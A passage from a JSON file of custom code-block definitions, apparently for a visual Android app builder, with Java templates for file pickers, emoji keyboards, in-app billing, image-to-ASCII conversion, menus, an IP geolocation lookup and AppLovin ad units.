","spec":"%m.FilePickerDialog setPositiveBtnName %s"},{"code":"%1$s.setNegativeBtnName(%2$s);","color":"#FF03A9F4","name":"setNagativeBtnName...","typeName":"","palette":"201","type":" ","spec":"%m.FilePickerDialog setNegativeBtnName %s"},{"code":"%1$s.show();","color":"#FF03A9F4","name":"show .","typeName":"","palette":"201","type":" ","spec":"%m.FilePickerDialog show"},{"code":"","color":"#FF00BFA5","name":"created by me  ....","typeName":"","palette":"202","type":"h","spec":"created by arab ware channel"},{"code":"DialogProperties %1$sp \u003d new DialogProperties();","color":"#FF00BFA5","name":"create new property....","typeName":"","palette":"202","type":" ","spec":"%m.FilePickerDialog create new property"},{"code":"%1$sp.selection_mode \u003d %2$s;\n%1$sp.selection_type \u003d DialogConfigs.FILE_SELECT;\n%1$sp.root \u003d new java.io.File(%4$s);\n%1$sp.error_dir \u003d new java.io.File(%4$s);\n%1$sp.offset \u003d new java.io.File(%4$s);\n%1$sp.extensions \u003d %3$s;","color":"#FF00BFA5","name":"set property....","typeName":"","palette":"202","type":" ","spec":"%m.FilePickerDialog set %m.selection_mode set %m.extensions set main path %s"},{"code":"DialogConfigs.SINGLE_MODE","color":"#FF00BFA5","name":"single....","typeName":"selection_mode","palette":"202","type":"v","spec":"single selection"},{"code":"DialogConfigs.MULTI_MODE","color":"#FF00BFA5","name":"multi....","typeName":"selection_mode","palette":"202","type":"v","spec":"multi selection"},{"code":"null","color":"#FF00BFA5","name":"null...","typeName":"extensions","palette":"202","type":"v","spec":"all"},{"code":"new String[] {%1$s}","color":"#FF00BFA5","name":"new....","typeName":"extensions","palette":"202","type":"v","spec":"extensions %s "},{"code":"%1$s,%2$s","color":"#FF00BFA5","name":"and.......","typeName":"String","palette":"202","type":"v","spec":"%s and %s"},{"code":"","color":"#FF00BFA5","name":"activity file picker...","typeName":"","palette":"202","type":"h","spec":"IN ACTIVITY \u003d\u003d\u003e"},{"code":"%1$s \u003d new FilePickerDialog(%2$s.this,%1$sp);\n%1$s.setTitle(%3$s);","color":"#FF00BFA5","name":"file....","typeName":"","palette":"202","type":" ","spec":"%m.FilePickerDialog create %m.activity with title %s"},{"code":"","color":"#FF00BFA5","name":"file picker fragment.....","typeName":"","palette":"202","type":"h","spec":"IN FRAGMENT \u003d\u003d\u003e"},{"code":"%1$s \u003d new FilePickerDialog(getActivity(),%1$sp);\n%1$s.setTitle(%3$s);","color":"#FF00BFA5","name":"file_copy80.....","typeName":"","palette":"202","type":" ","spec":"%m.FilePickerDialog create with title %s"},{"code":"%1$s.setDialogSelectionListener(new DialogSelectionListener() {\n@Override public void onSelectedFilePaths(String[] files) {\n%2$s\n} \n});","color":"#FF00BFA5","name":"on file picked....","typeName":"","palette":"202","type":"c","spec":"%m.FilePickerDialog on file picked"},{"code":"Arrays.asList(files).get((int) %1$s).toString()","color":"#FF00BFA5","name":"get file path at....","typeName":"","palette":"202","type":"s","spec":"get file path at %d"},{"code":"files.length","color":"#FF00BFA5","name":"getLength  .......","typeName":"","palette":"202","type":"d","spec":"get picked files length"},{"code":"%1$s.setPositiveBtnName(%2$s);","color":"#FF00BFA5","name":"setPositiveBtnName....","typeName":"","palette":"202","type":" ","spec":"%m.FilePickerDialog setPositiveBtnName %s"},{"code":"%1$s.setNegativeBtnName(%2$s);","color":"#FF00BFA5","name":"setNagativeBtnName......","typeName":"","palette":"202","type":" ","spec":"%m.FilePickerDialog setNegativeBtnName %s"},{"code":"%1$s.show();","color":"#FF00BFA5","name":"show .....","typeName":"","palette":"202","type":" ","spec":"%m.FilePickerDialog show"},{"code":"","color":"#FF43A047","name":"created by Arab Ware Channel ","typeName":"","palette":"203","type":"h","spec":"created by arab ware channel"},{"code":"LayoutInflater %1$sLL \u003d getLayoutInflater(); \nView %1$sVV \u003d %1$sLL.inflate(R.layout.%2$s, null);\n%1$s.addView(%1$sVV);","color":"#FF43A047","name":"CreateCustomLinear","typeName":"","palette":"203","type":" ","spec":"%m.LinearLayout create custom layout from %m.customViews"},{"code":"final %3$s %2$s \u003d (%3$s)\n%1$sVV.findViewById(R.id.%4$s);","color":"#FF43A047","name":"Add View Custom Linear","typeName":"","palette":"203","type":" ","spec":"%m.LinearLayout add view with id %s.inputOnly with type %m.typeview from id %s.inputOnly"},{"code":"","color":"#FFC2185B","name":"created by","typeName":"","palette":"204","type":"h","spec":"created by arab ware channel"},{"code":"AXEmojiManager.install(%2$s.this,new com.aghajari.emojiview.emoji.iosprovider.AXIOSEmojiProvider(%2$s.this));\n\nAXEmojiManager.getEmojiViewTheme().setFooterEnabled(%3$s);\n\nAXEmojiPager %1$sPage \u003d new AXEmojiPager(%2$s.this);\n\nAXEmojiView %1$sView \u003d new AXEmojiView(%2$s.this);\n%1$sPage.addPage(%1$sView, R.drawable.%4$s);\n\n%1$sPage.setEditText(%5$s);\n\n%1$sPage.setLeftIcon(R.drawable.%6$s);","color":"#FFC2185B","name":"emoji view","typeName":"","palette":"204","type":" ","spec":"%m.EmojiKeyboard create in %m.activity footer ? %b set page icon %m.resource set %m.edittext set left icon %m.resource"},{"code":"%1$s.setPopupAnimationEnabled(%2$s);\n%1$s.setPopupAnimationDuration(250);\n%1$s.initPopupView(%3$sPage);","color":"#FFC2185B","name":"layout...","typeName":"","palette":"204","type":" ","spec":"%m.view set layout to show emojis animation enable ? %b %m.EmojiKeyboard"},{"code":"if (%1$s.isShowing()) {\r\n\t%1$s.hideAndOpenKeyboard();\r\n%2$s\n}\r\nelse {\r\n\t%1$s.toggle();\n\t%1$s.show();\r\n%3$s\n}","color":"#FFC2185B","typeName":"","name":"is show ???","palette":"204","type":"e","spec":"%m.view if shown","spec2":"if not"},{"code":"","color":"#FFC2185B","name":"theme","typeName":"","palette":"204","type":"h","spec":"theme"},{"code":"AXEmojiManager.getEmojiViewTheme().setSelectionColor(%1$s);","color":"#FFC2185B","name":"set selection color","typeName":"","palette":"204","type":" ","spec":"set selection color %m.color"},{"code":"AXEmojiManager.getEmojiViewTheme().setFooterSelectedItemColor(%1$s);","color":"#FFC2185B","name":"set footer selected item color","typeName":"","palette":"204","type":" ","spec":"set footer selected item color %m.color"},{"code":"AXEmojiManager.getEmojiViewTheme().setFooterBackgroundColor(%1$s);","color":"#FFC2185B","name":"set background color ","typeName":"","palette":"204","type":" ","spec":"set background color %m.color"},{"code":"AXEmojiManager.getEmojiViewTheme().setSelectionColor(%1$s);","color":"#FFC2185B","name":"set selection on color","typeName":"","palette":"204","type":" ","spec":"set selection on color %m.color"},{"code":"AXEmojiManager.getEmojiViewTheme().setSelectedColor(%1$s);","color":"#FFC2185B","name":"set selected color","typeName":"","palette":"204","type":" ","spec":"set selected color %m.color"},{"code":"AXEmojiManager.getEmojiViewTheme().setCategoryColor(%1$s); AXEmojiManager.getEmojiViewTheme().setAlwaysShowDivider(%2$s);","color":"#FFC2185B","name":"theme ","typeName":"","palette":"204","type":" ","spec":"set category color %m.color show divider %b "},{"code":"%1$s.setOnFocusChangeListener(new OnFocusChangeListener() {\n@Override public void onFocusChange(View v, boolean hasFocus) \n{\nif (hasFocus) {\n%2$s\n} else {\n%3$s\n}\n}\n});","color":"#FFC2185B","typeName":"","name":"edittext on focus","palette":"204","type":"e","spec":"%m.edittext on foucs","spec2":"on disable focus"},{"code":"if(!BillingProcessor.isIabServiceAvailable(this)) {\n\n%s\n\n}","name":"IAP Initialize","palette":"205","type":"c","spec":"if BillingProcessor Service Not Available"},{"code":"%1$s \u003d new BillingProcessor(this, %2$s, %3$s, new BillingProcessor.IBillingHandler() {\n\n%4$s\n\n});","name":"BillingProcessorCheckSKU","palette":"205","type":"c","spec":"%m.BillingProcessor LisenceKey %s MerchantID %s"},{"code":"@Override\npublic void onProductPurchased(@NonNull String productId, @Nullable TransactionDetails details) {\n\n%s\n\n}","name":"onProductPurchased","palette":"205","type":"c","spec":"onProductPurchased"},{"code":"productId","name":"productId","typeName":"String","palette":"205","type":"v","spec":"productId"},{"code":"@Override\npublic void onBillingError(int errorCode, @Nullable Throwable error) {\n\nfinal String MessageError \u003d Integer.toString(errorCode);\n\n%s\n\n}","name":"onBillingError","palette":"205","type":"c","spec":"onBillingError"},{"code":"MessageError","name":"MessageError","typeName":"String","palette":"205","type":"v","spec":"MessageError"},{"code":"@Override\npublic void onBillingInitialized() {\n\n%s\n\n}","name":"onBillingInitialized","palette":"205","type":"c","spec":"onBillingInitialized ReadyToPurchase"},{"code":"@Override\npublic void onPurchaseHistoryRestored() {\nfor(String sku : %1$s.listOwnedProducts())\nLog.d(LOG_TAG, \"Owned Managed Product: \" + sku);\nfor(String sku : %1$s.listOwnedSubscriptions())\nLog.d(LOG_TAG, \"Owned Subscription: \" + sku);\n%2$s\n}","name":"onPurchaseHistoryRestored","palette":"205","type":"c","spec":"onPurchaseHistoryRestored %m.BillingProcessor"},{"code":"}\nprivate void updateInfoBilling() {\nfinal String buyProduct \u003d %2$s+\" is \"+(%1$s.isPurchased(%2$s) ? \"\" : \" not\")+\" purchased\";\nfinal String subcribeProduct \u003d %3$s+\" is \"+(%1$s.isSubscribed(%3$s) ? \"\" : \" not\")+\" subscribed\";\n%4$s\n}\n{","name":"onUpdateInfoBilling","palette":"205","type":"c","spec":"onUpdateInfoBilling %m.BillingProcessor ProductID %s or SubscriptionID %s"},{"code":"updateInfoBilling();","name":"updateInfoBilling","palette":"205","type":" ","spec":"updateInfoBilling"},{"code":"buyProduct","name":"buyProduct","typeName":"String","palette":"205","type":"v","spec":"buyProduct"},{"code":"subcribeProduct","name":"subcribeProduct","typeName":"String","palette":"205","type":"v","spec":"subcribeProduct"},{"code":"if (!%4$s) {\n%5$s\nreturn;\n}\n%2$s.purchase(%3$s.this, %1$s);","name":"ButtonBuyProduct","palette":"205","type":"c","spec":"Buy %s  %m.BillingProcessor at %m.activity ifNot %b"},{"code":"if (!%4$s) {\n%5$s\nreturn;\n}\n%2$s.purchase(%3$s.this, %1$s);","name":"ButtonSubscribeProduct","palette":"205","type":"c","spec":"Subscribe %s %m.BillingProcessor at %m.activity ifNot %b"},{"code":"if (%1$s !\u003d null)\n%1$s.release();","name":"ReleaseBillingProcessor","palette":"205","type":" ","spec":"ReleaseBillingProcessor %m.BillingProcessor"},{"code":"","name":"OnResultBillingResponse","palette":"205","type":" ","spec":"%s.inputOnly onActivityResult"},{"code":"}\n//create by Shyam Kumar Kshetri\npublic static class Img2Ascii {\n    private String[] chars \u003d {\"@\", \"#\", \"+\", \"\\\\\", \";\", \":\", \",\", \".\", \"`\", \" \"};\n    private Bitmap rgbImage;\n    private Boolean color \u003d false;\n    private int quality \u003d 3;\n    private int qualityColor \u003d 6;\n    private Spannable response;\n    private Listener listener;\n    public Img2Ascii(){\n    }\n    public Img2Ascii bitmap(Bitmap rgbImage){\n        this.rgbImage \u003d rgbImage;\n        return this;\n    }\n    public Img2Ascii quality(int quality){\n        this.quality \u003d quality;\n        return this;\n    }\n    public Img2Ascii color(Boolean color){\n        this.color \u003d color;\n        return this;\n    }\n    public void convert(Listener listener) {\n        this.listener \u003d listener;\n        new InstaApi().execute();\n    }\n    private class InstaApi extends AsyncTask\u003cString, Integer, Void\u003e {\n        private InstaApi(){\n        }\n        @Override\n        protected void onPreExecute() {\n            super.onPreExecute();\n        }\n        @Override\n        protected Void doInBackground(String... arg0) {\n            if(color) {\n                quality \u003d quality + qualityColor;\n                if (quality \u003e 5 + qualityColor || quality \u003c 1 + qualityColor)\n                    quality \u003d 3 + qualityColor;\n            }else{\n                if (quality \u003e 5 || quality \u003c 1)\n                    quality \u003d 3;\n            }\n            String tx;\n            SpannableStringBuilder span \u003d new SpannableStringBuilder();\n            int width \u003d rgbImage.getWidth();\n            int height \u003d rgbImage.getHeight();\n            int i \u003d 0;\n            for (int y \u003d 0; y \u003c height; y \u003d y + quality) {\n                for (int x \u003d 0; x \u003c width; x \u003d x + quality) {\n                    int pixel \u003d rgbImage.getPixel(x, y);\n                    int red \u003d Color.red(pixel);\n                    int green \u003d Color.green(pixel);\n                    int blue \u003d Color.blue(pixel);\n                    if(color) {\n                        tx \u003d \"#\";\n                        span.append(tx);\n                        span.setSpan(new android.text.style.ForegroundColorSpan(Color.rgb(red, green, blue)), i, i + 1, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);\n                    }else {\n                        int brightness \u003d red + green + blue;\n                        brightness \u003d java.lang.Math.round(brightness / (765 / (chars.length - 1)));\n                        tx \u003d chars[brightness];\n                        span.append(tx);\n                    }\n                    i++;\n                }\n                tx \u003d \"\\n\";\n                span.append(tx);\n                publishProgress(y, height);\n                i++;\n                if(isCancelled()) break;\n            }\n            response \u003d span;\n\n            return null;\n        }\n        protected void onProgressUpdate(Integer... progress) {\n            int current \u003d progress[0];\n            int total \u003d progress[1];\n            int percentage \u003d 100 * current / total;\n            listener.onProgress(percentage);\n        }\n        @Override\n        protected void onPostExecute(Void result) {\n            super.onPostExecute(result);\n            listener.onResponse(response);\n        }\n\n    }\n    public interface Listener {\n        void onProgress(int percentage);\n        void onResponse(Spannable response);\n    }","color":"#FF3F51B5","name":"ImageToASCIILibrary","typeName":"","palette":"206","type":" ","spec":"\u003e\u003e\u003e\u003e\u003e\u003e ImageToASCII Library created by Shyam Kumar Kshetri\u003c\u003c\u003c\u003c\u003c\u003c"},{"code":"new Img2Ascii()\n   .bitmap(%2$s)\n   .quality(%3$s) // 1 - 5\n   .color(%4$s)\n   .convert(new Img2Ascii.Listener() {\n      @Override\n      public void onProgress(int percentage) {\n         %1$s.setText(String.valueOf(percentage) + \" %%\");\n      }\n      @Override\n      public void onResponse(Spannable text) {\n         %1$s.setText(text);\n      }\n   });","color":"#FF3F51B5","name":"ImageToASCIISetText","typeName":"","palette":"206","type":" ","spec":"%m.textview setTextFrom %m.ImageFrom  quality(1-5) %d  enableColor %b"},{"code":"BitmapFactory.decodeResource(getResources(), R.drawable.%s)","color":"#FF3F51B5","name":"ImageToASCIIImageFromResource","typeName":"ImageFrom","palette":"206","type":"p","spec":"imageFromResource %m.resource"},{"code":"BitmapFactory.decodeFile(%s)","color":"#FF3F51B5","name":"ImageToASCIIImageFromFile","typeName":"ImageFrom","palette":"206","type":"p","spec":"imageFromFile %s"},{"code":"","color":"#FF0097A7","name":"created by jawad","typeName":"","palette":"207","type":"h","spec":"created by jawad"},{"code":"","color":"#FF0097A7","name":"created by arab ware channel team","typeName":"","palette":"207","type":"","spec":"jawad is member in arab ware team"},{"code":" }\n@Override\npublic boolean onCreateOptionsMenu (Menu menu){\nmenu.add(0, 0, 0, %1$s);\nmenu.add(0, 1, 1, %2$s);\nmenu.add(0, 2, 2, %3$s);\nreturn true;\n}\n\n@Override\npublic boolean onOptionsItemSelected(MenuItem item){\nswitch (item.getItemId()){","color":"#FF0097A7","name":"Add menu","typeName":"","palette":"207","type":" ","spec":"Add menu with item 1 name %s and item 2 %s and item 3 %s"},{"code":"case 0:\n%s\nbreak;","color":"#FF0097A7","name":"Case item 1","typeName":"","palette":"207","type":"c","spec":"Case item 1"},{"code":"case 1:\n%s\nbreak;","color":"#FF0097A7","name":"Case Item 2","typeName":"","palette":"207","type":"c","spec":"Case item 2"},{"code":"case 2:\n%\nbreak;\n}\nreturn super.onOptionsItemSelected(item);","color":"#FF0097A7","name":"Case item 3","typeName":"","palette":"207","type":"c","spec":"Case item 3"},{"code":"}\n@Override\npublic boolean onCreateOptionsMenu(Menu menu){\n\nmenu.add(%1$s).setIcon(R.drawable.%2$s).setShowAsAction(MenuItem.SHOW_AS_ACTION_NEVER);\n\nmenu.add(%3$s).setIcon(R.drawable.%4$s).setShowAsAction(MenuItem.SHOW_AS_ACTION_NEVER);\n\nreturn true;\n}\n\n@Override\npublic boolean onOptionsItemSelected(final MenuItem item) {\nswitch (item.getTitle().toString()) {","color":"#FF0097A7","name":"Toolbar items icons","typeName":"","palette":"207","type":" ","spec":"menu add in toolbar item1 %s with icon%m.resource item 2 %s with icon %m.resource"},{"code":"case %1$s:\n%2$s\nreturn true;","color":"#FF689F38","name":"Case item","typeName":"","palette":"207","type":"c","spec":"Case %s.inputOnly "},{"code":"default:\nreturn super.onOptionsItemSelected(item);\n}","color":"#FF689F38","name":"Show items","typeName":"","palette":"207","type":" ","spec":"show items"},{"code":"private String obterVersaoApp() {\n    try {\n        PackageInfo packageInfo \u003d getPackageManager().getPackageInfo(getPackageName(), 0);\n        return packageInfo.versionName;\n    } catch (PackageManager.NameNotFoundException e) {\n        e.printStackTrace();\n        return \"Versão não encontrada\";\n    }\n}","color":"#FF2196F3","name":"obterVersaoApp","typeName":"","palette":"200","type":"s","spec":"Obter a versão do app"},{"code":"","color":"#FF43A047","name":"created by arab ware channel","typeName":"","palette":"13","type":"h","spec":"created by arab ware channel"},{"code":"","color":"#FF43A047","name":"Add Source Directly Blocks","typeName":"","palette":"13","type":"h","spec":"Add Source Directly Blocks created By Arab Ware"},{"code":"/*%1$s*/","color":"#FF43A047","name":"comment","typeName":"","palette":"13","type":" ","spec":"comment %s.inputOnly"},{"code":"/*%1$s*/\n/*\n%2$s\n*/","color":"#FF43A047","name":"comment2","typeName":"","palette":"13","type":"c","spec":"comment %s.inputOnly"},{"code":"if (%1$s.equals(\"\")) {\r\n\t%1$s \u003d \"\".concat(\"%2$s\");\r\n}\r\nelse {\r\n\t%1$s \u003d %1$s.concat(\"\\n%2$s\");\r\n}","color":"#FF43A047","name":"copy blocks as text","typeName":"","palette":"13","type":"c","spec":"copy #one\u0026small block as text into %m.varStr"},{"code":"%1$s","color":"#FF43A047","name":"add source directly 1","typeName":"","palette":"13","type":" ","spec":"add source directly %s.inputOnly "},{"code":"%1$s","color":"#FF43A047","name":"add source directly 2","typeName":"","palette":"13","type":"s","spec":"add source directly %s.inputOnly "},{"code":"%1$s","color":"#FF43A047","name":"add source directly 3","typeName":"","palette":"13","type":"d","spec":"add source direclty %s.inputOnly "},{"code":"%1$s","color":"#FF43A047","name":"add source directly 4","typeName":"","palette":"13","type":"b","spec":"add source directly %s.inputOnly "},{"code":"%1$s","color":"#FF43A047","name":"add source directly 5","typeName":"","palette":"13","type":"f","spec":"add source directly %s.inputOnly "},{"code":"%1$s\n%3$s\n%2$s","color":"#FF43A047","name":"add source directly 6","typeName":"","palette":"13","type":"c","spec":"add source directly 1 %s.inputOnly  add source directly 2 %s.inputOnly  put between 1 and 2 this blocks"},{"code":"%1$s\n%4$s\n%2$s\n%5$s\n%3$s","color":"#FF43A047","typeName":"","name":"add source directly 7","palette":"13","type":"e","spec":"add source directly 1 %s.inputOnly add sorce directly 2 %s.inputOnly add source directly 3 %s.inputOnly |put between 1 and two this blocks|","spec2":"|put between 2 and 3 this blocks|"},{"code":"","color":"#FF43A047","name":"Arab Ware Operator Blocks","typeName":"","palette":"13","type":"h","spec":"New Blocks By Arab Ware Channel"},{"code":"String.valueOf((long)(%1$s)).concat(String.valueOf((long)(%2$s)))","color":"#FF43A047","name":"Join and block 1","typeName":"","palette":"13","type":"s","spec":"join %d with %d"},{"code":"Double.parseDouble(String.valueOf((long)(%1$s)).concat(String.valueOf((long)(%1$s))))","color":"#FF43A047","name":"join and block 2","typeName":"","palette":"13","type":"d","spec":"join %d and %d"},{"code":"String.valueOf((long)(%1$s)).equals(String.valueOf((long)(%2$s)))","color":"#FF43A047","name":"if number equals number","typeName":"","palette":"13","type":"b","spec":"%d equals %d"},{"code":"(String.valueOf((long)(%1$s)).contains(String.valueOf((long)(%2$s))))","color":"#FF43A047","name":"if number contains number","typeName":"","palette":"13","type":"b","spec":"%d contains %d"},{"code":"(%1$s \u003d\u003d %2$s) || (%1$s \u003e %2$s)","color":"#FF43A047","name":"equal or more","typeName":"","palette":"13","type":"b","spec":"%d equals or more than %d"},{"code":"(%1$s \u003d\u003d %2$s) || (%1$s \u003c %2$s)","color":"#FF43A047","name":"equals or less","typeName":"","palette":"13","type":"b","spec":"%d equals or less than %d"},{"code":"Patterns.WEB_URL.matcher(%1$s).matches()","color":"#FF43A047","name":"is link","typeName":"","palette":"13","type":"b","spec":"%s is link"},{"code":"%1$s","color":"#FF43A047","name":"create if command","typeName":"","palette":"13","type":"b","spec":"write you own boolean command here %s.inputOnly "},{"code":"String.valueOf((long)(%1$s)).replace(String.valueOf((long)(%2$s)), String.valueOf((long)(%3$s)))","color":"#FF43A047","name":"replace 1","typeName":"","palette":"13","type":"s","spec":"replace number in %d replace all %d with %d "},{"code":"Double.parseDouble(String.valueOf((long)(%1$s)).replace(String.valueOf((long)(%2$s)), String.valueOf((long)(%3$s))))","color":"#FF43A047","name":"replace 2","typeName":"","palette":"13","type":"d","spec":"replace number %d  replace all %d with %d"},{"code":"%1$s \u003d %2$s;","color":"#FF43A047","name":"Boolean","typeName":"","palette":"13","type":" ","spec":"%m.varBool set boolean command %s.inputOnly  "},{"code":"%1$s","color":"#FF43A047","name":"boolean","typeName":"","palette":"13","type":"s","spec":"get %m.varBool"},{"code":"\"http://ip-api.com/json/?fields\u003d61439\"","color":"#FF33691E","name":"IP Address API","typeName":"","palette":"208","type":"s","spec":"IP Address API"},{"code":"%1$s.get(\"city\").toString()","color":"#FF33691E","name":"gelt City","typeName":"","palette":"208","type":"s","spec":"%m.varMap  getCity"},{"code":"%1$s.get(\"regionName\").toString()","color":"#FF33691E","name":"gelt State","typeName":"","palette":"208","type":"s","spec":"%m.varMap  getSate"},{"code":"File internalStorageDir \u003d getApplicationContext().getFilesDir();\nString pathc \u003d internalStorageDir.getAbsolutePath();\n%1$s \u003d pathc;\n%2$s","color":"#FF827717","name":"Ditetorio interno privado _copy65","typeName":"","palette":"209","type":"c","spec":"  dir in pv  to str \u003d %m.varStr  "},{"code":"AppLovinSdk.getInstance( this ).setMediationProvider( \"max\" ); AppLovinSdk.initializeSdk( this, new AppLovinSdk.SdkInitializationListener()\n{\n@Override public void onSdkInitialized(final AppLovinSdkConfiguration configuration) {\n\n} } );\n\nAppLovinSdk.getInstance(this).getSettings().setTestDeviceAdvertisingIds(Arrays.asList(%1$s));\n","color":"#FF3E2723","name":"Inicializa SDK app Lovin","typeName":"","palette":"210","type":" ","spec":"AppLovin initializeSDK  setTestDeviceAdvertisingIds %s "},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS BANNER","typeName":"","palette":"210","type":"s","spec":"Anúncios bannerAppLovin por - SDB"},{"code":"final MaxAdView linear3_view \u003d new MaxAdView( %1$s, this );\nfinal MaxAdViewAdListener linear3_listener \u003d new MaxAdViewAdListener() {\n\n\n@Override\npublic void onAdLoaded(final MaxAd maxAd) {\nlinear3_view.setVisibility( View.VISIBLE );\n\n}\n\n@Override\npublic void onAdLoadFailed(final String adUnitId, final MaxError error) {\n\n\n}\n\n@Override\npublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error) {\nfinal String ErrorMessage \u003d error.getMessage();\n}\n\n@Override\npublic void onAdClicked(final MaxAd maxAd) {}\n\n@Override\npublic void onAdExpanded(final MaxAd maxAd) {}\n\n@Override\npublic void onAdCollapsed(final MaxAd maxAd) {}\n\n@Override\npublic void onAdDisplayed(final MaxAd maxAd) {}\n\n@Override\npublic void onAdHidden(final MaxAd maxAd) {}\n\n};\n\nlinear3_view.setListener( linear3_listener );\n\n%2$s.addView( linear3_view );\n\n\nlinear3_view.loadAd();\n","color":"#FF3E2723","name":"banner retangular","typeName":"","palette":"210","type":" ","spec":"banner retangular  id%s view %m.view  "},{"code":"nativeAdLoader \u003d new MaxNativeAdLoader( %1$s, %2$s.this);\n\nnativeAdLoader.setNativeAdListener(new MaxNativeAdListener()\n{\n@Override\npublic void onNativeAdLoaded(final MaxNativeAdView nativeAdView, final MaxAd ad)\n{\n\n// Clean up any pre-existing native ad to prevent memory leaks.\nif ( nativeAd !\u003d null )\n{\nnativeAdLoader.destroy( nativeAd );\n}\n\n// Save ad for cleanup.\nnativeAd \u003d ad;\n\n// Add ad view to view.\n%3$s.removeAllViews();\n%3$s.addView(nativeAdView );\n}\n\n@Override\npublic void onNativeAdLoadFailed(final String adUnitId, final MaxError error)\n{\n// We recommend retrying with exponentially higher delays up to a maximum delay\n}\n\n@Override\npublic void onNativeAdClicked(final MaxAd ad)\n{\n// Optional click callback\n}\n} );\n\nnativeAdLoader.loadAd();","color":"#FF3E2723","name":"native ad","typeName":"","palette":"210","type":" ","spec":"native ad id %s view activity %m.activity  %m.view   "},{"code":"\n\n\nfinal MaxAdView %2$s_view \u003d new MaxAdView( %1$s, MaxAdFormat.MREC, this );\n\t\tfinal MaxAdViewAdListener %2$s_listener \u003d new MaxAdViewAdListener() {\n\n\t\t\t\n\t\t\t@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd) {\n     \t%2$s_view.setVisibility( View.VISIBLE );\n\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error) {\n\t\t\n\t\t\t\t\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error) {\n\t\t\t\tfinal String ErrorMessage \u003d error.getMessage();\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdExpanded(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdCollapsed(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)  {}\n\n\t\t};\n\n        %2$s_view.setListener( %2$s_listener );\n\t\t%2$s.addView( %2$s_view );\n\n        \n        %2$s_view.loadAd();\n\t\t\t","color":"#FF3E2723","name":"AppLovin MREC","typeName":"","palette":"210","type":" ","spec":"MERC 300×250 Id %s  Layout %m.view  "},{"code":"ErrorMessage","color":"#FF3E2723","name":"errorm","typeName":"","palette":"210","type":"s","spec":"ErrorMessage"},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS INSTESTITIAL","typeName":"","palette":"210","type":"s","spec":"Anúncios intestitialdAppLovin por - SDB"},{"code":"%1$s \u003d new MaxInterstitialAd(%2$s, this);\n\t\tfinal MaxAdListener %1$s_listener \u003d new MaxAdListener() {\n%3$s\n\n};\n\t\t%1$s.setListener( %1$s_listener );\n%1$s.loadAd();","color":"#FF3E2723","name":"AppLovin Interstitial","typeName":"","palette":"210","type":"c","spec":"Load AppLovin Interstitial  %m. AdUnit Id  %s  set Listener"},{"code":"@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\t\t\t}\n\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Loaded","typeName":"","palette":"210","type":"c","spec":"On Interstitial Error"},{"code":"@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {\n%1$s\n}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)\n\t\t\t{\n\n\n\n\t\t\t}","color":"#FF3E2723","name":"On Interstitial Clicked","typeName":"","palette":"210","type":"c","spec":"On Interstitial Clicked"},{"code":"@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd)\n\t\t\t{\n\t\t\t\t\n\t\t\t\t\t\t\t\t\t%1$s\t\n\t\t\t\t\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Loaded ","typeName":"","palette":"210","type":"c","spec":"On Interstitial Loaded"},{"code":"@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {\n%1$s\n}","color":"#FF3E2723","name":"On Interstitial Displayed ","typeName":"","palette":"210","type":"c","spec":"On Interstitial Displayed"},{"code":"@Override\npublic void onAdHidden(final MaxAd maxAd) {\n%1$s \n}","color":"#FF3E2723","name":"On Interstitial Closed","typeName":"","palette":"210","type":"c","spec":"On Interstitial Closed"},{"code":"int1.showAd();","color":"#FF3E2723","name":"ShowAppLovin InterstitialAd","typeName":"","palette":"210","type":" ","spec":"Show int1 AppLovin InterstitialAd"},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS RIWARDED","typeName":"","palette":"210","type":"s","spec":"Anúncios riwardedAppLovin por - SDB"},{"code":"%1$s \u003d MaxRewardedAd.getInstance(%2$s, this);\n\n\t\tfinal MaxRewardedAdListener %1$s_listener \u003d new MaxRewardedAdListener() {\n%3$s\n\n};\n\n\t\t%1$s.setListener( %1$s_listener );\n\n        %1$s.loadAd();\n\t\t","color":"#FF3E2723","name":"Load Rewarded","typeName":"","palette":"210","type":"c","spec":"Load RewardedAd %m. AdUnit Id %s  set Listener"},{"code":"@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {\n%1$s\n}","color":"#FF3E2723","name":"On Rewarded Displayed","typeName":"","palette":"210","type":"c","spec":"On Rewarded Displayed"},{"code":"@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {\n%1$s\n}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)\n\t\t\t{\n\n\n\n\t\t\t}","color":"#FF3E2723","name":"On Interstitial Clicked ","typeName":"","palette":"210","type":"c","spec":"On Rewarded Clicked"},{"code":"@Override\n\t\t\tpublic void onRewardedVideoStarted(final MaxAd maxAd) {\n%1$s\n\n}","color":"#FF3E2723","name":"On Rewarded Video Started","typeName":"","palette":"210","type":"c","spec":"On Rewarded Video Started"},{"code":"@Override\n\t\t\tpublic void onAdLoaded(final MaxAd 